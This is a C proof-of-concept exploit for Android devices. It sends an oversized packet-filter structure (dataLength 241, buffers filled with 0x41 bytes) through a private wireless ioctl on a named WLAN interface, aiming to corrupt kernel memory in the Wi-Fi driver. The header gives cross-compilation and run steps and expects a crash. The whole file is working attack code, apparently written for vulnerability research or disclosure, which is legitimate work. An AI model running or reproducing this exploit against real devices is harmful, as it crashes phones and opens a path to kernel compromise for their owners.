/*
 * Coder: Shawn the R0ck, [citypw@gmail.com]
 * Co-worker: Pray3r, [pray3r.z@gmail.com]
 * Compile:
 * # arm-linux-androideabi-gcc wext_poc.c --sysroot=$SYS_ROOT  -pie
 * # ./a.out wlan0
 * Boom......shit happens[ as always];-)
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/wireless.h>
#include <errno.h>

typedef unsigned char v_U8_t;
#define HDD_MAX_CMP_PER_PACKET_FILTER     5

struct PacketFilterParamsCfg {
	v_U8_t protocolLayer;
	v_U8_t cmpFlag;
	v_U8_t dataOffset;
	v_U8_t dataLength;
	v_U8_t compareData[8];
	v_U8_t dataMask[8];
};

typedef struct {
	v_U8_t filterAction;
	v_U8_t filterId;
	v_U8_t numParams;
	struct PacketFilterParamsCfg
	    paramsData[HDD_MAX_CMP_PER_PACKET_FILTER];
} tPacketFilterCfg, *tpPacketFilterCfg;

int main(int argc, const char *argv[])
{
	if (argc != 2) {
		fprintf(stderr, "Bad usage\n");
		fprintf(stderr, "Usage: %s ifname\n", argv[0]);
		return -1;
	}

	struct iwreq req;
	strcpy(req.ifr_ifrn.ifrn_name, argv[1]);
	int fd, status, i = 0;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	tPacketFilterCfg p_req;

	/* crafting a data structure to triggering the code path */
	req.u.data.pointer =
	    malloc(sizeof(v_U8_t) * 3 +
		   sizeof(struct PacketFilterParamsCfg) * 5);
	p_req.filterAction = 1;
	p_req.filterId = 0;
	p_req.numParams = 3;
	for (; i < 5; i++) {
		p_req.paramsData[i].dataLength = 241;
		memset(&p_req.paramsData[i].compareData, 0x41, 16);
	}

	memcpy(req.u.data.pointer, &p_req,
	       sizeof(v_U8_t) * 3 +
	       sizeof(struct PacketFilterParamsCfg) * 5);

	if (ioctl(fd, 0x8bf7, &req) == -1) {
		fprintf(stderr, "Failed ioct() get on interface %s: %s\n",
			argv[1], strerror(errno));
	} else {
		printf("You shouldn't see this msg...\n");
	}

}